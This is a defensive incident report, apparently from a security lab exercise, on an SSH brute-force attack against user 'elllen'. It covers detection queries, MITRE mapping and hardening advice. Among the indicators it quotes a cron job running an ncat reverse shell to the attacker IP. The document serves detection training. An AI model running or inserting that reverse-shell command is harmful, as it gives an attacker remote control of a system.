# Incident Report: SSH Brute Force Attack with Persistence

## Executive Summary
On April 4, 2025, a successful brute force SSH attack originated from IP 192.168.211.69, compromising user "elllen" credentials. The attacker established persistence through a malicious cron job and attempted to maintain access via root credential changes. This incident demonstrates a complete attack chain from initial access to persistence.

## Investigation
- **Detection Source**: Elastic Security - system.auth, system.syslog, and auditd datasets
- **Query Used**:
  ```kql
  # Initial brute-force detection
  event.dataset : "system.auth" and event.outcome : "failure"

  # Successful authentication from attacker IP
  event.dataset: "system.auth" and system.auth.ssh.event: "Accepted" and source.ip: "192.168.211.69"
  
  # Persistence mechanism discovery
  event.dataset : "system.syslog" and process.name: "CRON"
  
  # Root credential changes
  event.dataset: "auditd.log" and user.name: "root" and event.action: "refreshed-credentials"
  ```
- **Observed Behavior**:
  - Massive SSH authentication failures from 192.168.211.69 followed by successful login
  - Unauthorized cron job configured to create reverse shell back to attacker IP
  - Suspicious root credential refresh activities from SSH session and terminal
  - Attacker successfully compromised elllen account via password-based authentication

## Findings
- **Source IP / Host**: 192.168.211.69
- **Target Hosts / Accounts**: Application servers (multiple), user "elllen", root account
- **Indicators**:
  - Failed SSH login attempts preceding successful compromise
  - Malicious cron job: `/usr/bin/ncat -e /bin/bash 192.168.211.69 9999`
  - Process ID 3616 associated with successful SSH login
  - Root credential refreshes from SSH session and /dev/pts/0 terminal
- **Outcome**: Successful initial access, persistence established, privilege escalation attempted

## Detection Logic
- **Brute Force**: Alert triggers when multiple authentication failures from same source IP are followed by successful login within short timeframe
- **Persistence**: Detection of unauthorized cron jobs or scheduled tasks creating reverse shells
- **Privilege Activity**: Monitoring for unexpected root credential changes or refreshes

## Recommendations
- **Containment**: Immediately block IP 192.168.211.69, remove malicious cron jobs, reset compromised credentials
- **Prevention**: Implement SSH key-based authentication, deploy fail2ban for rate limiting, enforce MFA for privileged accounts
- **Hardening**: Regular cron job auditing, root activity monitoring, network egress filtering
- **Monitoring**: Create alerts for cron job modifications, root credential changes, and successful logins after multiple failures

## MITRE ATT&CK Mapping
- **Technique**: T1110.001 - Brute Force: Password Guessing
- **Technique**: T1053.003 - Scheduled Task/Job: Cron
- **Technique**: T1078 - Valid Accounts
- **Tactic**: TA0001 - Initial Access, TA0003 - Persistence

## Lessons Learned
This lab emphasized the importance of correlating authentication failures with subsequent successful logins to detect brute force attacks. The attacker's use of cron jobs for persistence highlights the need for monitoring scheduled tasks across all systems. In a real SOC environment, I would implement behavioral analytics to detect patterns of failed-successful authentication sequences and establish baselines for normal cron job activity. The incident also demonstrated that attackers often use multiple persistence mechanisms, requiring comprehensive monitoring beyond just initial compromise detection.
